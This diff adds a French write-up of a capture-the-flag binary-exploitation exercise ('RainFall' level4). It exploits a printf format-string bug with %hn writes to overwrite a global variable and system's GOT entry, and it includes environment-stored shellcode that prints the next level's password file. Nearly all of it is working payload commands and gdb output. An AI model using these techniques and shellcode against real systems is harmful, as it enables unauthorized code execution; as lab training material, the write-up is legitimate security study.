@@ -1,0 +1,133 @@
+- Apres analyse du code, on se rend compte que le printf utilise le buffer
+récuperer avec fgets, ce qui le rend vulnerable.
+- On va réécrire un int qui sert de comparaison a une condition
+- On a réécrit aussi le pointeur sur system pour pouvoir executer notre shellcode
+situer dans l environement
+
+1) On explore la stack avec la faille de printf :
+
+	python -c 'print "AAAABBBB" + "%p." * 20' | ./level4
+
+	AAAABBBB0xb7ff26b0.0xbffff784.0xb7fd0ff4.(nil).(nil).0xbffff748.0x804848d.0xbffff540.0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141.0x42424242.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.
+
+AAAA et BBBB trouve au 12eme et 13eme argument
+
+2) Injection de la valeur 0x01025544 : 
+
+- 0x5544 :
+
+0x5544 - 8 - 13 = 0x552F ===> 21807
+
+- 0x0102
+
+0x10102 - 0x5544 = 0xABBE ===> 43966
+
+(python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%p" * 13 + "%21807x%12$hn%43966x%13$hn"') > /tmp/test4
+
+3) Correction a l'aide de gdb
+
+gdb ./level4
+break *0x08048492
+r < /tmp/test4
+i r
+
+Breakpoint 2, 0x08048492 in n ()
+(gdb) i r
+eax            0x16555a7        23418279
+ecx            0x0      0
+edx            0x0      0
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff500       0xbffff500
+ebp            0xbffff718       0xbffff718
+esi            0x0      0
+edi            0x0      0
+
+
+0x55a7 - 0x5544 = 0x63 ===> On soustrait 99 au 1er
+
+(python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%p" * 13 + "%21708x%12$hn%43966x%13$hn"') > /tmp/test4
+
+4) Modifier l'injection pour avoir une 2eme modification
+
+python -c 'print "AAAABBBBCCCCDDDD" + "%p." * 20' | ./level4
+
+AAAABBBBCCCCDDDD0xb7ff26b0.0xbffff784.0xb7fd0ff4.(nil).(nil).0xbffff748.0x804848d.0xbffff540.0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141.0x42424242.0x43434343.0x44444444.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.
+
+CCCC et DDDD et trouve au 14 et 15ème argument
+
+5) Exporter le shellcode dans l'environement :
+
+ export TOTO=`python -c 'print "\x90" * 100 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/user/level5/.pass; whoami; exit"'`
+
+
+6) Avoir l'addresse mémoire de system
+
+level4@RainFall:~$ objdump -R ./level4
+
+./level4:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+080497f0 R_386_JUMP_SLOT   system
+
+7) Connaitre l'addresse memoire du shellcode
+
+gdb ./level4
+break *0x08048464
+r < /tmp/test4
+x/1024xg $esp
+
+0xbffffe40:     0x6264672f6e69622f      0x6f682f3d44575000
+0xbffffe50:     0x2f726573752f656d      0x4c00346c6576656c
+0xbffffe60:     0x555f6e653d474e41      0x00382d4654552e53
+0xbffffe70:     0x9090903d4f544f54      0x9090909090909090
+0xbffffe80:     0x9090909090909090      0x9090909090909090
+0xbffffe90:     0x9090909090909090      0x9090909090909090
+0xbffffea0:     0x9090909090909090      0x9090909090909090
+0xbffffeb0:     0x9090909090909090      0x9090909090909090
+
+==> On va pointer sur 0xbffffeb0
+
+8) Realiser l'injection
+
+- Modifier le 1er membre avec gdb :
+
+ (python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "\xf0\x97\x04\x08" + "\xf2\x97\x04\x08" + "%p" * 15 + "%21708x%12$hn%43966x%13$hn"') > /tmp/test4
+
+(gdb) i r
+eax            0x11c555e        18634078
+ecx            0x0      0
+edx            0x0      0
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff440       0xbffff440
+ebp            0xbffff658       0xbffff658
+esi            0x0      0
+edi            0x0      0
+eip            0x8048492        0x8048492 <n+59>
+eflags         0x200286 [ PF SF IF ID ]
+cs             0x73     115
+ss             0x7b     123
+
+0x555e - 0x5544 = 26 => On soustrait 26 au 1er membre ==> 21682
+
+- On ajoute le second membre :
+
+0xfeb0 - 0x0102 = 0xfdae ===> 64942
+
+0x1bfff - 0xfdae = 0xc251 ===> 49745
+
+- Verif du 2nd membre :
+
+(gdb) x/10x 0x080497f0
+0x80497f0 <system@got.plt>:     0xc101feb0      0x08048376      0xb7e453e0      0x00000000
+0x8049800 <__dso_handle>:       0x00000000      0xb7fd1ac0      0x00000000      0x00000000
+0x8049810 <m>:  0x01025544      0x00000000
+
+0xc101 - 0xbfff = 0x102 ====> soustraire 258 ===> 49487
+
+- Exploit complet :
+
+ export TOTO=`python -c 'print "\x90" * 100 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/user/level5/.pass; whoami; exit"'`
+
+(python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "\xf0\x97\x04\x08" + "\xf2\x97\x04\x08" + "%p" * 15 + "%21682x%12$hn%43966x%13$hn" + "%64942x%14$hn%49487x%15$hn"') | ./level4
+
